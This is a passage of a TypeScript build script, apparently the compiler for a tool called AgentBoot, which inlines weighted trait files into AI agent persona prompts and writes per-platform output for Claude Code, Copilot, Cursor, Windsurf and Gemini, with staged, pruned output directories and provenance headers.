/**
 * AgentBoot compile script.
 *
 * Reads agentboot.config.json, traverses core/traits/ and core/personas/,
 * composes each persona by inlining trait content, and writes output to
 * dist/{platform}/ — one self-contained distribution per platform.
 *
 * Output structure:
 *   dist/skill/   — cross-platform SKILL.md (agentskills.io, traits inlined)
 *   dist/claude/  — Claude Code native (.claude/ format)
 *   dist/copilot/ — GitHub Copilot (.github/ format)
 *
 * Each platform folder contains the full scope hierarchy:
 *   dist/{platform}/core/
 *   dist/{platform}/groups/{group}/
 *   dist/{platform}/teams/{group}/{team}/
 *
 * Trait injection points in SKILL.md:
 *   <!-- traits:start -->
 *   (existing content is replaced on each build)
 *   <!-- traits:end -->
 *
 * Usage:
 *   npm run build
 *   tsx scripts/compile.ts
 *   tsx scripts/compile.ts --config path/to/agentboot.config.json
 */

import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import chalk from "chalk";
import {
  type AgentBootConfig,
  type PersonaConfig,
  type DomainManifest,
  type PluginManifest,
  type ResolvedTrait,
  resolveConfigPath,
  loadConfig,
  stripJsoncComments,
  flattenNodes,
  groupsToNodes,
  normalizeTraitRefs,
  DEFAULT_WEIGHT,
  WEIGHT_MAP,
  agentbootNpxSpec,
  DEFAULT_OUTPUT_FORMATS,
  VALID_OUTPUT_FORMATS,
  PLATFORM_REQUIRES,
} from "./lib/config.js";
import { parseFrontmatter, resolveCompositionType } from "./lib/frontmatter.js";
import { buildTelemetryJsonSchema, TELEMETRY_SCHEMA_VERSION } from "./lib/telemetry-schema.js";
import { PLATFORM_ENFORCEMENT, CAPABILITY_SUPPORT, effectiveEmitters, type CapabilityContext } from "./lib/conformance.js";
import {
  inspectArtifact, unenforceableFormats, capabilityViolations,
  countNarrowlyScopedInstructions, countScopedGotchas,
} from "./lib/guardrail-scan.js";
import { HUB_EXCEPTIONS_FILE, loadExceptionsFile, validateExceptions, type PolicyException } from "./lib/exceptions.js";
import { dangerousHookFindings } from "./lib/hook-safety.js";
import { hookInputCapPrelude } from "./lib/hook-prelude.js";
import { mergeManagedFragments, type MergeConflict, type MergeResult, type MalformedHook } from "./lib/managed-merge.js";
import {
  inspectScope, degradedFormats, scopeViolations, scopePreamble,
  APPLY_TO_PROJECTION, type ScopedArtifact,
} from "./lib/scope-projection.js";
import { diffTrees, inventoryTree } from "./lib/prune.js";
import {
  computeConfigDigest, writeDistStamp, markDistBuildFailed,
} from "./lib/dist-stamp.js";

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ROOT is the installed agentboot package directory. Use this ONLY for
// package-internal assets (templates/skills, package.json).
const ROOT = path.resolve(__dirname, "..");

// HUB_ROOT is the loaded config file's directory — the hub repo being
// built. Use this for all hub content (core/traits, core/personas,
// core/instructions, core/gotchas, nodes/, groups/, teams/). Set by main()
// after configDir is computed. Defaults to ROOT so scripts that bypass
// main() still work against the package's own core.
//
// This decoupling fixes a bug where compile.ts and validate.ts looked for
// hub content inside the installed package directory instead of in the
// hub being built. Paths to hub content must go through HUB_ROOT; paths
// to package-internal assets stay on ROOT.
let HUB_ROOT: string = ROOT;

interface TraitContent {
  name: string;
  content: string;
  filePath: string;
  /** Verbatim file content including frontmatter — for copy-out paths. */
  raw: string;
}

interface CompileResult {
  persona: string;
  platforms: string[];
  traitsInjected: string[];
  scope: "core" | "group" | "team";
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function fatal(msg: string): never {
  console.error(chalk.red(`✗ FATAL: ${msg}`));
  process.exit(1);
}

function log(msg: string): void {
  console.log(msg);
}

function ensureDir(dirPath: string): void {
  fs.mkdirSync(dirPath, { recursive: true });
}

// ---------------------------------------------------------------------------
// dist/ staging + prune (F-1)
// ---------------------------------------------------------------------------

/**
 * The staging directory for the build currently in flight, or null when there
 * is nothing to clean up. Registered on `process.on("exit")` so a crash, a
 * `fatal()`, or a mid-build `process.exit(1)` leaves the previous `dist/`
 * byte-identical instead of half-overwritten.
 */
let stagingDistPath: string | null = null;

/**
 * N1: everything needed to INVALIDATE the previous `dist/` when this build does
 * not finish. Armed as soon as the config is loaded; cleared by the successful
 * swap. While it is non-null, a non-zero exit means "the tree at finalDistPath
 * is now known-stale" and the exit hook records that ON DISK.
 *
 * Without this, staging's (correct) blast-radius behaviour — leave the previous
 * dist/ byte-identical — is indistinguishable, to every downstream consumer,
 * from a successful build that produced no changes.
 */
let distInvalidationContext:
  | { finalDistPath: string; configDigest: string; outputFormats: string[]; version: string }
  | null = null;

process.on("exit", (code) => {
  if (stagingDistPath && fs.existsSync(stagingDistPath)) {
    try {
      fs.rmSync(stagingDistPath, { recursive: true, force: true });
    } catch {
      /* best effort — never mask the real exit code */
    }
  }
  // A build that did not reach the swap leaves a dist/ that no longer
  // corresponds to the config on disk. Say so. Silence is not success.
  if (code !== 0 && distInvalidationContext) {
    const ctx = distInvalidationContext;
    markDistBuildFailed(
      ctx.finalDistPath,
      `build exited ${code} before the staged tree was swapped into place`,
      ctx.configDigest,
      ctx.outputFormats,
      ctx.version,
    );
  }
});

/** Version of the installed agentboot package, for the dist stamp. */
function packageVersion(): string {
  try {
    const pkgPath = path.join(ROOT, "package.json");
    const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf-8")) as { version?: string };
    return pkg.version ?? "0.0.0";
  } catch {
    return "0.0.0";
  }
}

/**
 * Refuse to point the build (which now DELETES this tree on every run) at
 * anything that is not plainly a generated output directory.
 */
function assertSafeDistTarget(finalDistPath: string, configDir: string): void {
  let stat: fs.Stats | undefined;
  try {
    stat = fs.lstatSync(finalDistPath);
  } catch {
    stat = undefined;
  }
  if (stat?.isSymbolicLink()) {
    fatal(
      `output.distPath is a symlink: ${finalDistPath}\n  The build replaces this directory wholesale; refusing to follow a symlink.`,
    );
  }
  const resolvedConfigDir = path.resolve(configDir);
  if (path.resolve(finalDistPath) === resolvedConfigDir) {
    fatal(`output.distPath resolves to the hub root: ${finalDistPath}`);
  }
  const rel = path.relative(resolvedConfigDir, path.resolve(finalDistPath));
  if (rel.startsWith("..") || path.isAbsolute(rel)) {
    fatal(
      `output.distPath resolves outside the hub: ${finalDistPath}\n  The build replaces this directory wholesale; it must live under ${resolvedConfigDir}.`,
    );
  }
}

/** Recursive copy used only as the EXDEV fallback for the staging swap. */
function copyTree(src: string, dest: string): void {
  fs.mkdirSync(dest, { recursive: true });
  for (const entry of fs.readdirSync(src, { withFileTypes: true })) {
    const from = path.join(src, entry.name);
    const to = path.join(dest, entry.name);
    if (entry.isDirectory()) copyTree(from, to);
    else fs.copyFileSync(from, to);
  }
}

/**
 * Swap the staging tree into place and report exactly what stopped being
 * produced. Per "Silence Is Not Success" the zero case is printed too — "no
 * artifact went stale" and "pruning never ran" must not look identical.
 */
function swapDistAndReport(stagingPath: string, finalPath: string): void {
  const before = inventoryTree(finalPath);
  const after = inventoryTree(stagingPath);
  const { removed, retiredTrees } = diffTrees(before, after);

  if (fs.existsSync(finalPath)) {
    fs.rmSync(finalPath, { recursive: true, force: true });
  }
  try {
    fs.renameSync(stagingPath, finalPath);
  } catch {
    // Cross-device or a Windows rename-over — fall back to copy + remove.
    // Never fall back to "keep the old tree and exit 0": that is the silent
    // skip this whole change exists to eliminate.
    try {
      copyTree(stagingPath, finalPath);
      fs.rmSync(stagingPath, { recursive: true, force: true });
    } catch (err: unknown) {
      fatal(
        `Could not move the staged build into place.\n` +
          `  Staged output is at: ${stagingPath}\n` +
          `  Target was:          ${finalPath}\n` +
          `  Cause: ${err instanceof Error ? err.message : String(err)}`,
      );
    }
  }
  stagingDistPath = null;

  if (removed.length === 0 && retiredTrees.length === 0) {
    log(chalk.gray(`  dist/ pruned: 0 stale artifact(s), 0 retired platform tree(s)`));
    return;
  }

  if (removed.length > 0) {
    log(chalk.yellow(`  Pruned ${removed.length} stale artifact(s) from dist/:`));
    for (const p of removed.slice(0, 20)) {
      log(chalk.gray(`    − dist/${p}`));
    }
    if (removed.length > 20) {
      log(chalk.gray(`    … and ${removed.length - 20} more`));
    }
  }
  if (retiredTrees.length > 0) {
    log(
      chalk.yellow(
        `  Pruned ${retiredTrees.length} retired platform tree(s): ${retiredTrees.join(", ")}`,
      ),
    );
  }
}

/**
 * F-6: place a block AFTER the leading frontmatter (and therefore after the
 * provenance header withProvenance inserts there), so frontmatter-first formats
 * keep opening with the YAML delimiter.
 */
function insertAfterFrontmatter(text: string, block: string): string {
  const m = text.match(/^---\n[\s\S]*?\n---\n*/);
  if (!m) return `${block}\n${text}`;
  return `${m[0]}${block}\n${text.slice(m[0].length)}`;
}

function provenanceHeader(sourceFile: string, config: AgentBootConfig): string {
  // Hub content, so this must resolve against HUB_ROOT — not ROOT (the installed
  // package dir). Using ROOT produced headers like
  // "../../../../../Users/<name>/hub/core/instructions/x.md": unusable for tracing
  // output back to source, and it leaked the operator's local filesystem layout
  // into every file synced to every spoke.
  const relSource = path.relative(HUB_ROOT, sourceFile);
  const timestamp = new Date().toISOString();
  const org = config.orgDisplayName ?? config.org;
  return [
    `<!-- ============================================================ -->`,
    `<!-- AgentBoot compiled output — do not edit manually.           -->`,
    `<!-- Source:    ${relSource.padEnd(44)} -->`,
    `<!-- Compiled:  ${timestamp.padEnd(44)} -->`,
    `<!-- Org:       ${org.padEnd(44)} -->`,
    `<!-- ============================================================ -->`,
    "",
  ].join("\n");
}

/**
 * Attach the provenance header WITHOUT breaking frontmatter-first formats.
 * The Agent Skills spec (and Claude Code's own loaders) require SKILL.md to
 * BEGIN with the YAML frontmatter delimiter — any content before `---` fails
 * the official skills-ref validator. When the content opens with frontmatter,
 * the provenance comment is inserted immediately AFTER the closing `---`
 * (comments in the body are unrestricted); otherwise it is prepended as before.
 */
function withProvenance(content: string, sourceFile: string, config: AgentBootConfig): string {
  if (config.output?.provenanceHeaders === false) return content;
  const header = provenanceHeader(sourceFile, config);
  const fmMatch = content.match(/^(---\r?\n[\s\S]*?\r?\n---\r?\n)/);
  if (fmMatch) {
    return `${fmMatch[1]}${header}${content.slice(fmMatch[1]!.length)}`;
  }
  return `${header}${content}`;
}

// ---------------------------------------------------------------------------
// Trait loading
// ---------------------------------------------------------------------------

function loadTraits(
  coreTraitsDir: string,
  enabledTraits: string[] | undefined
): Map<string, TraitContent> {
  const traits = new Map<string, TraitContent>();

  if (!fs.existsSync(coreTraitsDir)) {
    log(chalk.yellow(`  ⚠ Traits directory not found: ${coreTraitsDir} — skipping trait injection`));
    return traits;
  }

  const traitFiles = fs.readdirSync(coreTraitsDir).filter((f) => f.endsWith(".md"));

  for (const file of traitFiles) {
    const traitName = path.basename(file, ".md");

    if (enabledTraits && !enabledTraits.includes(traitName)) {
      continue;
    }

    const filePath = path.join(coreTraitsDir, file);
    const raw = fs.readFileSync(filePath, "utf-8");

    // decision-0005: traits may now carry identity frontmatter (id/slug/hash).
    // Strip it HERE, once, rather than at each consumer — two consumers
    // (selectTraitTier and the persona injector) did not strip, so per-site
    // stripping would have leaked `id:`/`hash:` into every compiled persona.
    // `content` is the composable body; `raw` keeps the file verbatim for the
    // copy-out paths that reproduce the source artifact.
    const content = raw.replace(/^---\n[\s\S]*?\n---\n*/, "");

    traits.set(traitName, {
      name: traitName,
      content: content.trim(),
      raw: raw.trim(),
      filePath,
    });
  }

  return traits;
}

// ---------------------------------------------------------------------------
// Lexicon loading — ubiquitous language term definitions
// ---------------------------------------------------------------------------

interface LexiconEntry {
  term: string;
  definition: string;
  extras?: Record<string, string> | undefined; // includes, format, usage, see, etc.
}

/**
 * Load lexicon entries from core/lexicon/ directory.
 * Supports both YAML (.yaml/.yml) and Markdown (.md) formats.
 *
 * YAML format:
 *   terms:
 *     full-build:
 *       definition: Complete validation pipeline.
 *       includes: lint, typecheck, test, build
 *
 * Markdown format:
 *   **full-build**: Complete validation pipeline. Includes lint, typecheck, test, build.
 */
function loadLexicon(lexiconDir: string): LexiconEntry[] {
  const entries: LexiconEntry[] = [];

  if (!fs.existsSync(lexiconDir)) {
    return entries;
  }

  for (const file of fs.readdirSync(lexiconDir).sort()) {
    const filePath = path.join(lexiconDir, file);
    const ext = path.extname(file).toLowerCase();

    if (ext === ".yaml" || ext === ".yml") {
      // Parse YAML-like term definitions (simple key: value parsing, no yaml dependency)
      const content = fs.readFileSync(filePath, "utf-8");
      const lines = content.split("\n");
      let currentTerm: string | null = null;
      let currentDef = "";
      const currentExtras: Record<string, string> = {};

      for (const line of lines) {
        // Skip "terms:" header
        if (line.trim() === "terms:" || line.trim() === "" || line.trim().startsWith("#")) continue;

        // Top-level term (2-space indent, ends with colon)
        const termMatch = line.match(/^  (\S+):$/);
        if (termMatch) {
          // Save previous term
          if (currentTerm && currentDef) {
            entries.push({ term: currentTerm, definition: currentDef, extras: Object.keys(currentExtras).length > 0 ? { ...currentExtras } : undefined });
          }
          currentTerm = termMatch[1]!;
          currentDef = "";
          for (const k of Object.keys(currentExtras)) delete currentExtras[k];
          continue;
        }

        // Property of current term (4-space indent)
        const propMatch = line.match(/^    (\w+):\s*(.+)$/);
        if (propMatch && currentTerm) {
          const [, key, value] = propMatch;
          if (key === "definition") {
            currentDef = value!;
          } else {
            currentExtras[key!] = value!;
          }
        }
      }
      // Save last term
      if (currentTerm && currentDef) {
        entries.push({ term: currentTerm, definition: currentDef, extras: Object.keys(currentExtras).length > 0 ? { ...currentExtras } : undefined });
      }
    } else if (ext === ".md") {
      // Parse markdown term definitions: **term**: definition
      const content = fs.readFileSync(filePath, "utf-8");
      for (const line of content.split("\n")) {
        const mdMatch = line.match(/^\*\*(.+?)\*\*:\s*(.+)$/);
        if (mdMatch) {
          entries.push({ term: mdMatch[1]!, definition: mdMatch[2]! });
        }
      }
    }
  }

  return entries;
}

/**
 * Compile lexicon entries into a compact glossary block for CLAUDE.md output.
 * Optimized for token density — term + definition on one line, minimal markdown.
 */
function compileLexiconBlock(entries: LexiconEntry[]): string {
  if (entries.length === 0) return "";

  const lines = ["## Lexicon", ""];
  for (const entry of entries) {
    let line = `- **${entry.term}**: ${entry.definition}`;
    if (entry.extras) {
      const extraParts = Object.entries(entry.extras)
        .map(([k, v]) => `${k}: ${v}`)
        .join("; ");
      line += ` (${extraParts})`;
    }
    lines.push(line);
  }
  lines.push("");
  return lines.join("\n");
}

// ---------------------------------------------------------------------------
// Persona config loading
// ---------------------------------------------------------------------------

function loadPersonaConfig(personaDir: string): PersonaConfig | null {
  const configPath = path.join(personaDir, "persona.config.json");
  if (!fs.existsSync(configPath)) {
    return null;
  }
  const raw = fs.readFileSync(configPath, "utf-8");
  try {
    return JSON.parse(stripJsoncComments(raw)) as PersonaConfig;
  } catch {
    log(chalk.yellow(`  ⚠ Failed to parse persona.config.json in ${personaDir}`));
    return null;
  }
}

// ---------------------------------------------------------------------------
// Trait injection
// ---------------------------------------------------------------------------

const TRAITS_START_MARKER = "<!-- traits:start -->";
const TRAITS_END_MARKER = "<!-- traits:end -->";

// ---------------------------------------------------------------------------
// AB-134: Trait calibration preambles
// ---------------------------------------------------------------------------

/**
 * Per-trait calibration text keyed by weight threshold.
 * Only traits that opt into calibration are listed here.
 * The key is the numeric weight as a string (e.g., "0.3").
 */
// AB-161: Pattern-specific configuration defaults
export const PATTERN_CONFIGS: Record<string, { maxTurns?: number; planFirst?: boolean }> = {
  react: { maxTurns: 10 },
  rewoo: { maxTurns: 5, planFirst: true },
  router: { maxTurns: 1 },
  sequential: { maxTurns: 3 },
  "tool-calling": { maxTurns: 1 },
};

const TRAIT_CALIBRATIONS: Record<string, Record<string, string>> = {
  "critical-thinking": {
    "0.3": "Apply light scrutiny: surface only CRITICAL findings. Trust the author's intent; flag only clear defects with high confidence. Suppress WARN/NOTE/INFO.",
    "0.5": "Apply standard scrutiny: surface CRITICAL and ERROR findings reliably. Flag WARN items that represent real risk. Omit nitpicks and style preferences.",
    "0.7": "Apply thorough scrutiny: actively seek hidden issues. Surface all CRITICAL/ERROR/WARN. Flag MEDIUM-confidence concerns. Question non-obvious design choices.",
    "1.0": "Apply adversarial scrutiny: assume hostile or incorrect input. Verify every assumption. Surface all findings at all severity levels. Treat absence of proof as a concern.",
  },
  "structured-output": {
    "0.3": "Use prose by default. Apply structured format with severity/location/recommendation only when explicitly requested.",
    "0.7": "Always use structured format with severity, location, and recommendation fields. Prose is acceptable only for brief clarifications between structured blocks.",
    "1.0": "Enforce strict schema adherence on every output. Every finding must include severity, location, recommendation, and confidence. Never fall back to unstructured prose.",
  },
  "source-citation": {
    "0.3": "Cite file and line references only for CRITICAL findings. Omit citations for lower-severity observations.",
    "0.7": "Cite file:line references for every finding at WARN severity or above. Include function or symbol names where available.",
    "1.0": "Cite every claim with exact file:line references. Link each assertion to its source evidence. Never state a finding without a traceable location.",
  },
  "audit-trail": {
    "0.3": "Provide final conclusions only. Omit intermediate reasoning unless the conclusion is ambiguous or surprising.",
    "0.7": "Explain reasoning for every significant decision. Show the chain of evidence from observation to conclusion.",
    "1.0": "Document the full reasoning chain for every decision. Show each step from evidence to inference to conclusion. Make the audit trail complete enough for independent verification.",
  },
  "confidence-signaling": {
    "0.3": "Signal confidence only on uncertain or ambiguous claims. Omit confidence markers when the finding is straightforward.",
    "0.7": "State confidence level (HIGH/MEDIUM/LOW) on every finding. Distinguish between verified facts and inferred conclusions.",
    "1.0": "State explicit confidence level on every claim. Justify each confidence assessment with the evidence that supports or limits it. Flag every assumption as such.",
  },
  "schema-awareness": {
    "0.3": "Flag only breaking schema changes that would cause runtime errors. Ignore cosmetic type mismatches and optional field omissions.",
    "0.7": "Validate all schemas, types, and contracts proactively. Flag any type mismatch, missing required field, or contract violation.",
    "1.0": "Enforce exhaustive schema validation. Flag every type mismatch, missing field, and implicit any. Verify that all inputs and outputs conform to declared contracts at every boundary.",
  },
};

/**
 * Build a calibration preamble for a trait at a given weight.
 * Returns empty string if the trait has no calibration or weight is DEFAULT.
 */
export function buildWeightPreamble(traitName: string, weight: number): string {
  const calibrations = TRAIT_CALIBRATIONS[traitName];
  if (!calibrations) return "";

  // Only inject preamble when weight differs from default
  if (weight === DEFAULT_WEIGHT) return "";

  // Find the closest calibration text for this weight.
  // Use toFixed(1) to match keys like "1.0" (String(1.0) produces "1", not "1.0").
  const key = weight.toFixed(1);
  if (calibrations[key]) return calibrations[key]!;

  // Find the nearest defined key
  const keys = Object.keys(calibrations).map(Number).sort((a, b) => a - b);
  let closest = keys[0]!;
  let closestDist = Math.abs(weight - closest);
  for (const k of keys) {
    const dist = Math.abs(weight - k);
    if (dist < closestDist) {
      closest = k;
      closestDist = dist;
    }
  }
  return calibrations[closest.toFixed(1)] ?? "";
}

/**
 * Weight-tier section convention for trait files.
 *
 * A trait MAY split weight-sensitive guidance into per-tier sections whose `###`
 * heading text matches a named weight: `### LOW`, `### MEDIUM`, `### HIGH`, `### MAX`
 * (case-insensitive; the non-OFF entries of WEIGHT_MAP). Everything else — content
 * before the first tier heading and any non-tier `###`/`##`/`#` section — is
 * WEIGHT-INDEPENDENT and always included (e.g. Overview, Anti-Patterns, Interaction).
 *
 * At a given weight, selectTraitTier keeps all weight-independent content plus ONLY the
 * single nearest-matching tier section, in document order. A trait with no tier sections
 * is returned unchanged, so existing (untiered) traits compile byte-identically. This is
 * what lets a persona carry just the guidance for the weight it uses instead of inlining
 * every tier's prose at every weight (the token-budget bloat).
 */
const TRAIT_TIER_NAMES = Object.keys(WEIGHT_MAP).filter((n) => n !== "OFF");
const TRAIT_TIER_HEADING = new RegExp(`^###\\s+(${TRAIT_TIER_NAMES.join("|")})\\s*$`, "i");

/** Map a numeric weight to the nearest named tier section (OFF excluded). */
export function weightToTier(weight: number): string {
  let best = TRAIT_TIER_NAMES[0]!;
  let bestDist = Infinity;
  for (const name of TRAIT_TIER_NAMES) {
    const dist = Math.abs(weight - (WEIGHT_MAP[name] ?? DEFAULT_WEIGHT));
    if (dist < bestDist) {
      bestDist = dist;
      best = name;
    }
  }
  return best;
}

/**
 * Return the weight-appropriate slice of a trait's content per the tier convention.
 * Untiered content is returned unchanged (backward compatible).
 */
export function selectTraitTier(content: string, weight: number): string {
  const sectionHeading = /^#{1,3}\s/; // any h1–h3 heading closes an open tier section
  const lines = content.split("\n");

  // Backward compatible: no tier sections → inject the whole trait unchanged.
  if (!lines.some((l) => TRAIT_TIER_HEADING.test(l))) return content;

  const selected = weightToTier(weight);
  const kept: string[] = [];
  let currentTier: string | null = null;
  for (const line of lines) {
    const tierMatch = line.match(TRAIT_TIER_HEADING);
    if (tierMatch) {
      currentTier = tierMatch[1]!.toUpperCase();
      if (currentTier === selected) kept.push(line);
      continue;
    }
    if (sectionHeading.test(line)) {
      // A non-tier h1–h3 heading is weight-independent and closes any open tier section.
      currentTier = null;
      kept.push(line);
      continue;
    }
    if (currentTier === null || currentTier === selected) kept.push(line);
  }
  return kept.join("\n");
}

/**
 * Valid values for `ab.modelOverrides` — the Claude Code Agent SDK model aliases,
 * plus any explicit `claude-*` model id. An invalid override (a typo like "sonet"
 * or a foreign model) would otherwise be injected verbatim into agent frontmatter
 * and silently ignored (or error) at runtime; catch it at build time instead.
 */
const VALID_AB_MODEL_ALIASES = new Set(["opus", "sonnet", "haiku", "inherit"]);
export function isValidAbModel(value: string): boolean {
  const v = value.trim().toLowerCase();
  if (VALID_AB_MODEL_ALIASES.has(v)) return true;
  return /^claude-[a-z0-9.-]+$/.test(v);
}

function injectTraits(
  skillContent: string,
  resolvedTraits: ResolvedTrait[],
  traits: Map<string, TraitContent>,
  personaName: string
): { result: string; injected: string[] } {
  const injected: string[] = [];
  const missing: string[] = [];

  const blocks: string[] = [];
  for (const { name: traitName, weight } of resolvedTraits) {
    // Skip traits with weight 0.0 (OFF)
    if (weight === 0.0) continue;

    const trait = traits.get(traitName);
    if (!trait) {
      missing.push(traitName);
      continue;
    }
    injected.push(traitName);

    // Build weight annotation and optional calibration preamble
    const weightLabel = weight !== DEFAULT_WEIGHT
      ? ` (weight: ${weight})`
      : "";
    const preamble = buildWeightPreamble(traitName, weight);
    const preambleBlock = preamble ? `${preamble}\n\n` : "";

    // Inject only the weight-appropriate slice of the trait (untiered traits are
    // returned whole — see selectTraitTier). Keeps personas from carrying every
    // tier's prose at every weight.
    const tierContent = selectTraitTier(trait.content, weight);

    blocks.push(
      `<!-- trait: ${traitName}${weightLabel} -->\n${preambleBlock}${tierContent}\n<!-- /trait: ${traitName} -->`
    );
  }

  if (missing.length > 0) {
    log(
      chalk.yellow(
        `  ⚠ [${personaName}] Traits not found (skipped): ${missing.join(", ")}`
      )
    );
  }

  const injectedBlock =
    blocks.length > 0
      ? `\n\n${blocks.join("\n\n")}\n\n`
      : "\n\n<!-- no traits configured -->\n\n";

  const startIdx = skillContent.indexOf(TRAITS_START_MARKER);
  const endIdx = skillContent.indexOf(TRAITS_END_MARKER);

  if (startIdx !== -1 && endIdx !== -1 && endIdx > startIdx) {
    const before = skillContent.slice(0, startIdx + TRAITS_START_MARKER.length);
    const after = skillContent.slice(endIdx);
    return {
      result: `${before}${injectedBlock}${after}`,
      injected,
    };
  }

  return {
    result: `${skillContent.trimEnd()}\n\n${TRAITS_START_MARKER}${injectedBlock}${TRAITS_END_MARKER}\n`,
    injected,
  };
}

// ---------------------------------------------------------------------------
// Platform-specific output builders
// ---------------------------------------------------------------------------

function buildSkillOutput(
  _personaName: string,
  _personaConfig: PersonaConfig | null,
  composedContent: string,
  config: AgentBootConfig,
  skillPath: string
): string {
  return withProvenance(composedContent, skillPath, config);
}

/**
 * Build CC-native skill file.
 * CC expects: .claude/skills/{skill-name}.md with description frontmatter.
 * The skill name comes from the invocation (e.g., "/review-code" → "review-code").
 */
function buildClaudeOutput(
  personaName: string,
  personaConfig: PersonaConfig | null,
  composedContent: string,
  _config: AgentBootConfig
): { content: string; skillName: string } {
  const invocation = personaConfig?.invocation ?? `/${personaName}`;
  const skillName = invocation.replace(/^\//, "");
  const description = personaConfig?.description ?? personaName;
  // Escape for YAML double-quoted strings
  const safeDescription = description
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/\n/g, " ")
    .replace(/---/g, "\\-\\-\\-");

  // AB-18: CC skill frontmatter with context:fork → delegates to agent
  const frontmatterLines: string[] = [
    "---",
    `description: "${safeDescription}"`,
    "context: fork",
    `agent: "${personaName}"`,
  ];

  // Optional: include model override if specified
  if (personaConfig?.model) {
    frontmatterLines.push(`model: "${personaConfig.model}"`);
  }

  frontmatterLines.push("---", "");

  // Strip any existing frontmatter from composed content (it's SKILL.md format)
  const withoutFrontmatter = composedContent.replace(/^---\n[\s\S]*?\n---\n*/, "");

  return {
    content: `${frontmatterLines.join("\n")}\n${withoutFrontmatter}`,
    skillName,
  };
}

function buildCopilotOutput(
  personaName: string,
  personaConfig: PersonaConfig | null,
  composedContent: string,
  config: AgentBootConfig,
  skillPath: string
): string {
  const header = `# ${personaConfig?.name ?? personaName} (AgentBoot)\n\n`;
  const description = personaConfig?.description
    ? `${personaConfig.description}\n\n---\n\n`
    : "";
  // Strip HTML comments for Copilot output.
  const stripped = composedContent.replace(/<!--[\s\S]*?-->/g, "").trim();
  return `${provenanceHeader(skillPath, config)}${header}${description}${stripped}\n`;
}

// ---------------------------------------------------------------------------
// Cursor output: .cursor/rules/*/RULE.md
// ---------------------------------------------------------------------------

function buildCursorRule(
  name: string,
  content: string,
  options?: { globs?: string[] | undefined; alwaysApply?: boolean }
): string {
  const lines: string[] = ["---"];
  lines.push(`description: "${name}"`);
  if (options?.globs && options.globs.length > 0) {
    if (options.globs.length === 1) {
      lines.push(`globs: "${options.globs[0]}"`);
    } else {
      lines.push("globs:");
      for (const glob of options.globs) {
        lines.push(`  - "${glob}"`);
      }
    }
  }
  lines.push(`alwaysApply: ${options?.alwaysApply ?? false}`);
  lines.push("---", "");
  // Strip HTML comments and trait markers for clean Cursor output
  const stripped = content.replace(/<!--[\s\S]*?-->/g, "").trim();
  lines.push(stripped);
  return lines.join("\n") + "\n";
}

// ---------------------------------------------------------------------------
// Copilot agents: .github/agents/*.agent.md
// ---------------------------------------------------------------------------

function buildCopilotAgent(
  personaName: string,
  personaConfig: PersonaConfig | null,
  composedContent: string,
  _config: AgentBootConfig
): string {
  const name = personaConfig?.name ?? personaName;
  const description = personaConfig?.description ?? personaName;
  const model = personaConfig?.model ?? "claude-sonnet-4-6";
  const safeName = name.replace(/"/g, '\\"');
  const safeDescription = description.replace(/"/g, '\\"');
  const stripped = composedContent.replace(/<!--[\s\S]*?-->/g, "").replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
  const frontmatter = [
    "---",
    `name: "AgentBoot ${safeName}"`,
    `description: "${safeDescription}"`,
    `model: "${model}"`,
    "tools:",
    "  - codebase",
    "  - terminal",
    "---",
  ].join("\n");
  return `${frontmatter}\n\n${stripped}\n`;
}

// ---------------------------------------------------------------------------
// AB-146: Windsurf output: .windsurfrules (flat text, project-level)
// ---------------------------------------------------------------------------

function buildWindsurfRules(
  personaName: string,
  personaConfig: PersonaConfig | null,
  composedContent: string,
  _config: AgentBootConfig
): string {
  const header = `# ${personaConfig?.name ?? personaName}\n# ${personaConfig?.description ?? ""}\n\n`;
  // Strip HTML comments and frontmatter for clean Windsurf output
  const stripped = composedContent
    .replace(/<!--[\s\S]*?-->/g, "")
    .replace(/^---\n[\s\S]*?\n---\n*/, "")
    .trim();
  return `${header}${stripped}\n`;
}

// ---------------------------------------------------------------------------
// AB-144: Gemini output: GEMINI.md + .gemini/ rules
// ---------------------------------------------------------------------------

function buildGeminiOutput(
  personaName: string,
  personaConfig: PersonaConfig | null,
  composedContent: string,
  _config: AgentBootConfig
): string {
  const header = `# ${personaConfig?.name ?? personaName}\n\n`;
  const description = personaConfig?.description
    ? `${personaConfig.description}\n\n---\n\n`
    : "";
  // Strip HTML comments for Gemini output
  const stripped = composedContent
    .replace(/<!--[\s\S]*?-->/g, "")
    .replace(/^---\n[\s\S]*?\n---\n*/, "")
    .trim();
  return `${header}${description}${stripped}\n`;
}

// ---------------------------------------------------------------------------
// Persona compilation — writes to each platform's dist folder
// ---------------------------------------------------------------------------

function compilePersona(
  personaName: string,
  personaDir: string,
  traits: Map<string, TraitContent>,
  config: AgentBootConfig,
  distPath: string,
  scopePath: string,
  groupName?: string,
  teamName?: string
): CompileResult {
  const skillPath = path.join(personaDir, "SKILL.md");
  const scope: "core" | "group" | "team" = teamName ? "team" : groupName ? "group" : "core";

  if (!fs.existsSync(skillPath)) {
    log(chalk.yellow(`  ⚠ [${personaName}] No SKILL.md found — skipping`));
    return { persona: personaName, platforms: [], traitsInjected: [], scope };
  }

  const personaConfig = loadPersonaConfig(personaDir);
  const skillContent = fs.readFileSync(skillPath, "utf-8");

  // Determine which traits to inject (supports both array and weight-object formats).
  let resolvedTraits: ResolvedTrait[] = personaConfig?.traits
    ? normalizeTraitRefs(personaConfig.traits)
    : [];

  if (groupName && personaConfig?.groups?.[groupName]?.traits) {
    const groupTraits = normalizeTraitRefs(personaConfig.groups[groupName]!.traits!);
    resolvedTraits = [...resolvedTraits, ...groupTraits];
  }

  if (teamName && personaConfig?.teams?.[teamName]?.traits) {
    const teamTraits = normalizeTraitRefs(personaConfig.teams[teamName]!.traits!);
    resolvedTraits = [...resolvedTraits, ...teamTraits];
  }

  // Deduplicate by name — last occurrence wins (team > group > core)
  const seen = new Map<string, ResolvedTrait>();
  for (const rt of resolvedTraits) {
    seen.set(rt.name, rt);
  }
  resolvedTraits = [...seen.values()];

  const { result: composed, injected } = injectTraits(
    skillContent,
    resolvedTraits,
    traits,
    personaName
  );

  // A5: one default, imported. This site used to add "agents" to the fallback
  // while main() did not, so a config omitting personas.outputFormats compiled
  // per-persona output for a platform the build never announced or pruned.
